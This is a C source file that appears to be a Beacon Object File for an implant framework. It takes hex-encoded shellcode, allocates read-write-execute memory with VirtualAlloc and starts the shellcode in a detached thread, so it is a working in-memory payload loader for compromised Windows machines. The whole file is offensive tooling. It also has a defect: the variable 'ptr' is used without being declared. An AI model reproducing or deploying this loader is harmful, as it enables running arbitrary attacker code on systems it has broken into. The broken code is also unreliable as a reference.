/*
 * shellcode.c - Execute raw shellcode in-memory
 *
 * Usage: shellcode <hex_shellcode>
 *
 * Arguments:
 *   hex_shellcode - Raw shellcode as hexadecimal string
 *
 * This BOF allocates memory with PAGE_EXECUTE_READWRITE and executes
 * the shellcode in a new thread.
 */

#include <windows.h>
#include "../Beacon/include/coff/beacon.h"

DECLSPEC_IMPORT void* WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

// Hex to binary conversion
static int hex_to_bin(const char* hex, unsigned char* bin, int bin_len) {
    int i, j;
    for (i = 0, j = 0; i < bin_len && hex[j] && hex[j+1]; i++, j += 2) {
        char high = hex[j];
        char low = hex[j + 1];
        unsigned char h, l;

        // High nibble
        if (high >= '0' && high <= '9') h = high - '0';
        else if (high >= 'a' && high <= 'f') h = high - 'a' + 10;
        else if (high >= 'A' && high <= 'F') h = high - 'A' + 10;
        else return -1;

        // Low nibble
        if (low >= '0' && low <= '9') l = low - '0';
        else if (low >= 'a' && low <= 'f') l = low - 'a' + 10;
        else if (low >= 'A' && low <= 'F') l = low - 'A' + 10;
        else return -1;

        bin[i] = (h << 4) | l;
    }
    return i;
}

void go(char* args, unsigned long arglen) {
    if (args == NULL || arglen == 0) {
       BeaconPrintf(CALLBACK_OUTPUT, "Usage: shellcode <hex_shellcode>");
        return;
    }

    const char* hex_shellcode = ptr;
    int hex_len = 0;
    while (ptr < args + arglen && *ptr != '\0') {
        hex_len++;
        ptr++;
    }

    if (hex_len % 2 != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error: Hex string must have even length (got %d)", hex_len);
        return;
    }

    // Determine shellcode size (half of hex length)
    int shellcode_size = hex_len / 2;

    if (shellcode_size == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error: Empty shellcode");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Allocating %d bytes for shellcode...", shellcode_size);

    void* alloc = KERNEL32$VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (alloc == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error: VirtualAlloc failed (0x%08x)", KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Allocated at 0x%p", alloc);

    int decoded = hex_to_bin(hex_shellcode, (unsigned char*)alloc, shellcode_size);

    if (decoded != shellcode_size) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error: Invalid hex string (decoded %d bytes, expected %d)", decoded, shellcode_size);
        KERNEL32$VirtualFree(alloc, 0, MEM_RELEASE);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Executing shellcode...");

    // Execute in a new thread
    HANDLE thread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);

    if (thread == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error: CreateThread failed (0x%08x)", KERNEL32$GetLastError());
        KERNEL32$VirtualFree(alloc, 0, MEM_RELEASE);
        return;
    }

    // Don't wait - let it run independently
    KERNEL32$CloseHandle(thread);

    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode thread started at 0x%p", alloc);
}